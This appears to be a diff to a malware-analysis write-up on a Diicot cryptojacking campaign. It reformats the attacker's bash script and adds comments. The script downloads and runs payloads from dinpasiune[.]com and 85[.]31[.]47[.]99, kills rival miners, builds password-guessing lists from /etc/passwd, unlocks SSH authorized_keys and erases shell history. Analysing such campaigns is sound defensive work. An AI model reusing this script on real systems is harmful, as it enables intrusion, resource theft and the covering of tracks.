@@ -729,11 +729,136 @@ This Diicot malware campaign includes crypto-jacking capabilities. The `Update` 
 Script
 
 ```bash
-./retea -c ' #!/bin/bash key=$1 user=$2 if [[ $key == "KOFVwMxV7k7XjP7fwXPY6Cmp16vf8EnL54650LjYb6WYBtuSs3Zd1Ncr3SrpvnAU" ]] then echo -e "" else echo Logged with successfully. rm -rf .retea crontab -r ; pkill xrx ; pkill haiduc ; pkill blacku ; pkill xMEu ; cd /var/tmp ; rm -rf /dev/shm/.x /var/tmp/.update-logs /var/tmp/Documents /tmp/.tmp ; mkdir /tmp/.tmp ; pkill Opera ; rm -rf xmrig .diicot .black Opera ; rm -rf .black xmrig.1 ; pkill cnrig ; pkill java ; killall java ; pkill xmrig ; killall cnrig ; killall xmrig ; wget -q dinpasiune[.]com/payload || curl -O -s -L dinpasiune[.]com/payload || wget 85[.]31[.]47[.]99/payload || curl -O -s -L 85[.]31[.]47[.]99/payload ; chmod +x * ; ./payload >/dev/null 2>&1 & disown ; history -c ; rm -rf .bash_history ~/.bash_history chmod +x .teaca ; ./.teaca > /dev/null 2>&1 ; history -c ; rm -rf .bash_history ~/.bash_history fi rm -rf /etc/sysctl.conf ; echo "fs.file-max = 2097152" > /etc/sysctl.conf ; sysctl -p ; ulimit
--Hn ; ulimit -n 99999 -u 999999 cd /dev/shm mkdir /dev/shm/.x > /dev/null 2>&1 mv network .x/ cd .x rm -rf retea ips iptemp ips iplist sleep 1 rm -rf pass useri=cat /etc/passwd |grep -v nologin |grep -v false |grep -v sync |grep -v halt|grep -v shutdown|cut -d: -f1 echo $useri > .usrs pasus=.usrs check=grep -c . .usrs for us in $(cat $pasus) ; do printf "$us $us\n" >> pass printf "$us $us"$us"\n" >> pass printf "$us "$us"123\n" >> pass printf "$us "$us"123456\n" >> pass printf "$us 123456\n">> pass printf "$us 1\n">> pass printf "$us 12\n">> pass printf "$us 123\n">> pass printf "$us 1234\n">> pass printf "$us 12345\n">> pass printf "$us 12345678\n">> pass printf "$us 123456789\n">> pass printf "$us 123.com\n">> pass printf "$us 123456.com\n">> pass printf "$us 123\n" >> pass printf "$us 1qaz@WSX\n" >> pass printf "$us "$us"@123\n" >> pass printf "$us "$us"@1234\n" >> pass printf "$us "$us"@123456\n" >> pass printf "$us "$us"123\n" >> pass printf "$us "$us"1234\n" >> pass printf "$us "$us"123456\n" >> pass printf "$us qwer1234\n" >> pass printf "$us 111111\n">> pass printf "$us Passw0rd\n" >> pass printf "$us P@ssw0rd\n" >> pass printf "$us qaz123!@#\n" >> pass printf "$us !@#\n" >> pass printf "$us password\n" >> pass printf "$us Huawei@123\n" >> pass done wait sleep 0.5 cat bios.txt | sort -R | uniq | uniq > i cat i > bios.txt ./network "rm -rf /var/tmp/Documents ; mkdir /var/tmp/Documents 2>&1 ; crontab -r ; chattr -iae ~/.ssh/authorized_keys >/dev/null 2>&1 ; cd /var/tmp ; chattr -iae /var/tmp/Documents/.diicot ; pkill Opera ; pkill cnrig ; pkill java ; killall java ; pkill xmrig ; killall cnrig ; killall xmrig ;cd /var/tmp/; mv /var/tmp/diicot /var/tmp/Documents/.diicot ; mv /var/tmp/kuak /var/tmp/Documents/kuak ; cd /var/tmp/Documents ; chmod +x .* ; /var/tmp/Documents/.diicot >/dev/null 2>&1 & disown ; history -c ; rm -rf .bash_history ~/.bash_history ; rm -rf /tmp/cache ; cd /tmp/ ; wget -q 85[.]31[.]47[.]99/.NzJjOTYwxx5/.balu || curl -O -s -L 85[.]31[.]47[.]99/.NzJjOTYwxx5/.balu ; mv .balu cache ; chmod +x cache ; ./cache >/dev/null 2>&1 & disown ; history -c ; rm -rf .bash_history ~/.bash_history" sleep 25 function Miner { rm -rf /dev/shm/retea /dev/shm/.magic ; rm -rf /dev/shm/.x ~/retea /tmp/kuak /tmp/diicot /tmp/.diicot ; rm -rf ~/.bash_history history -c } Miner ' ./retea KOFVwMxV7k7XjP7fwXPY6Cmp16vf8EnL54650LjYb6WYBtuSs3Zd1Ncr3SrpvnAU Haceru
+#!/bin/bash
+key=$1
+user=$2
+
+if [[ $key == "KOFVwMxV7k7XjP7fwXPY6Cmp16vf8EnL54650LjYb6WYBtuSs3Zd1Ncr3SrpvnAU" ]]; then
+    echo -e ""
+else
+    echo "Logged in successfully."
+    
+    # Remove traces and terminate specific processes
+    rm -rf .retea 
+    crontab -r
+    pkill xrx
+    pkill haiduc
+    pkill blacku
+    pkill xMEu
+    cd /var/tmp
+    rm -rf /dev/shm/.x /var/tmp/.update-logs /var/tmp/Documents /tmp/.tmp
+    mkdir /tmp/.tmp
+    pkill Opera
+    rm -rf xmrig .diicot .black Opera
+    rm -rf .black xmrig.1
+    pkill cnrig
+    pkill java
+    killall java
+    pkill xmrig
+    killall cnrig
+    killall xmrig
+
+    # Download and execute malicious payload
+    wget -q dinpasiune[.]com/payload || curl -O -s -L dinpasiune[.]com/payload || \
+    wget 85[.]31[.]47[.]99/payload || curl -O -s -L 85[.]31[.]47[.]99/payload
+    chmod +x *
+    ./payload >/dev/null 2>&1 & disown
+
+    # Remove shell history to cover tracks
+    history -c
+    rm -rf .bash_history ~/.bash_history
+
+    chmod +x .teaca
+    ./.teaca > /dev/null 2>&1
+
+    history -c
+    rm -rf .bash_history ~/.bash_history
+fi
+
+# System modification for increased file limits
+rm -rf /etc/sysctl.conf
+echo "fs.file-max = 2097152" > /etc/sysctl.conf
+sysctl -p
+ulimit -Hn
+ulimit -n 99999 -u 999999
+
+# Create hidden directory in shared memory
+cd /dev/shm
+mkdir /dev/shm/.x > /dev/null 2>&1
+mv network .x/
+cd .x
+rm -rf retea ips iptemp ips iplist
+sleep 1
+rm -rf pass
+
+# Extract system usernames and generate password guesses
+useri=$(cat /etc/passwd | grep -vE "nologin|false|sync|halt|shutdown" | cut -d: -f1)
+echo $useri > .usrs
+pasus=.usrs
+
+for us in $(cat $pasus); do
+    printf "$us $us\n" >> pass
+    printf "$us ${us}${us}\n" >> pass
+    printf "$us ${us}123\n" >> pass
+    printf "$us ${us}123456\n" >> pass
+    printf "$us 123456\n" >> pass
+    printf "$us 1\n" >> pass
+    printf "$us 12\n" >> pass
+    printf "$us 123\n" >> pass
+    printf "$us 1234\n" >> pass
+    printf "$us 12345\n" >> pass
+    printf "$us 12345678\n" >> pass
+    printf "$us 123456789\n" >> pass
+    printf "$us 123.com\n" >> pass
+    printf "$us 123456.com\n" >> pass
+    printf "$us 1qaz@WSX\n" >> pass
+    printf "$us ${us}@123\n" >> pass
+    printf "$us ${us}@1234\n" >> pass
+    printf "$us ${us}@123456\n" >> pass
+    printf "$us qwer1234\n" >> pass
+    printf "$us 111111\n" >> pass
+    printf "$us Passw0rd\n" >> pass
+    printf "$us P@ssw0rd\n" >> pass
+    printf "$us qaz123!@#\n" >> pass
+    printf "$us !@#\n" >> pass
+    printf "$us password\n" >> pass
+    printf "$us Huawei@123\n" >> pass
+done
+
+sleep 0.5
+
+# Randomize and sort BIOS information
+cat bios.txt | sort -R | uniq > i
+cat i > bios.txt
+
+# Execute another malicious payload
+./network "rm -rf /var/tmp/Documents; mkdir /var/tmp/Documents 2>&1; \
+crontab -r; chattr -iae ~/.ssh/authorized_keys >/dev/null 2>&1; \
+cd /var/tmp; chattr -iae /var/tmp/Documents/.diicot; \
+pkill Opera; pkill cnrig; pkill java; killall java; pkill xmrig; killall cnrig; killall xmrig; \
+cd /var/tmp/; mv /var/tmp/diicot /var/tmp/Documents/.diicot; \
+mv /var/tmp/kuak /var/tmp/Documents/kuak; cd /var/tmp/Documents; chmod +x .*; \
+/var/tmp/Documents/.diicot >/dev/null 2>&1 & disown; \
+history -c; rm -rf .bash_history ~/.bash_history; \
+rm -rf /tmp/cache; cd /tmp/; wget -q 85[.]31[.]47[.]99/.NzJjOTYwxx5/.balu || \
+curl -O -s -L 85[.]31[.]47[.]99/.NzJjOTYwxx5/.balu; \
+mv .balu cache; chmod +x cache; ./cache >/dev/null 2>&1 & disown; \
+history -c; rm -rf .bash_history ~/.bash_history"
+
+sleep 25
+
+# Function to remove traces
+function Miner {
+    rm -rf /dev/shm/retea /dev/shm/.magic
+    rm -rf /dev/shm/.x ~/retea /tmp/kuak /tmp/diicot /tmp/.diicot
+    rm -rf ~/.bash_history
+    history -c
+}
+
+Miner
 ```
 
-The script specifically kills processes associated with other crypto miners (`xmrig`, `cnrig`, `java`) and the script contains several instances of a payload download. Both the domain and the URL found in the download command (dinpasiune[.]com, 85[.]31[.]47[.]99) are classified as malicious by VirusTotal.
+The script specifically kills processes associated with other crypto miners (`xmrig`, `cnrig`, `java`) and the script contains several instances of a payload download. Both the domain and the URL found in the download command (`dinpasiune[.]com`, `85[.]31[.]47[.]99`) are classified as malicious by VirusTotal.
 
 Conducting OSINT on the domain name revealed threat intelligence indicating that the domain as indeed linked to cryptojacking activity.
 (https://x.com/r3dbU7z/status/1648586927266832384/photo/1)
